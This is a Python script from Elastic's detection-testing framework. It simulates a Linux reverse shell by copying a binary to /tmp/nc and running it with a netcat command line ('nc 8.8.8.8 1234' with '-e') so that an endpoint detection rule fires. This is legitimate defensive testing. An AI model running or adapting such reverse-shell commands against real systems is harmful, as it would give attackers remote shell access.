# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import logging
import sys

from . import OSType, RuleMetadata, _common, register_code_rta

log = logging.getLogger(__name__)


@register_code_rta(
    id="ecb34b55-2947-48af-b746-3a472abfda43",
    name="linux_reverse_shell_via_netcat",
    platforms=[OSType.LINUX],
    endpoint_rules=[RuleMetadata(id="c0ca8114-254d-46ba-88c6-db57de6efe2d", name="Linux Reverse Shell via netcat")],
    siem_rules=[],
    techniques=["T1059", "T1071"],
)
def main() -> None:
    log.info("Creating a fake nc executable..")
    masquerade = "/tmp/nc"
    source = _common.get_resource_path("bin/netcon_exec_chain.elf")
    _common.copy_file(source, masquerade)
    log.info("Granting execute permissions...")
    _ = _common.execute_command(["chmod", "+x", masquerade])
    commands = [masquerade, "chain", "-h", "8.8.8.8", "-p", "1234", "-c", "-e", "nc 8.8.8.8 1234"]
    log.info("Simulating reverse shell activity..")
    _ = _common.execute_command([*commands], timeout_secs=5, shell=True)  # noqa: S604
    log.info("Reverse shell simulation successful!")
    log.info("Cleaning...")
    _common.remove_file(masquerade)
    log.info("Simulation successfull!")


if __name__ == "__main__":
    sys.exit(main())
